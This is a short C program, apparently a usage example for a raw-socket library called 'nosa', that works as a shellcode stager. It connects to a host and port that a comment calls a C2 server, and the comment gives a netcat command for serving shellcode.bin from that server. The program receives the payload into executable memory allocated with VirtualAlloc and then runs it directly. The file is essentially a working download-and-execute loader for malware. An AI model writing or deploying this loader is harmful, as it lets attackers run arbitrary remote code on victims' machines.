#include <stdio.h>
#include "nosa.h"

int main() {
   
    //  [ C2 Server ] 
    //  nc -lnvp 8888 < shellcode.bin
    
    HANDLE hSocket = NULL;
    char* socketType = "TCP";         // Protocol (TCP, UDP, RAW)
    char* host = "127.0.0.1";         // Target Host
    int port = 8888;                  // Target port

    unsigned char pktPtr_send[MAX_SENT_BYTES] = { 0 };  // Craft our TCP packet request
    snprintf((char*)pktPtr_send, MAX_SENT_BYTES, "PING!\n", socketType); // Format the string and store it in pktPtr_send
 
    // Allocate a virtual buffer for our shellcode (MUST TO BE NULL-FREE)
    LPVOID pktPtr_resp = VirtualAlloc(0, MAX_RECV_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memset(pktPtr_resp, 0, MAX_RECV_BYTES); // clear our created vm alloc

    /*
        You can reuse the existing handle to perform iterative operations [request -> response].
        After the handle is created for the first time, you can follow this steps:
        nosa_connect();
        '-> while (1) {  nosa_send(); nosa_recv(); } 
    */

    // Connect into remote host
    nosa_connect(&hSocket, host, port, socketType);
    // Send client packets
    nosa_send(&hSocket, pktPtr_send, sizeof(pktPtr_send));
    printf("nosa_send() -> Request:\n");
    hexdump(&pktPtr_send, 0x100);

    // Receive and print TCP packet response
    nosa_recv((HANDLE*)hSocket, pktPtr_resp);
    printf("nosa_recv() -> Response:\n");
    
    hexdump(pktPtr_resp, 0x100);

    ((void(*)())pktPtr_resp)();

    // Close the target socket
    if (hSocket) {
        afd_close(hSocket);
    }

    return 0;
}
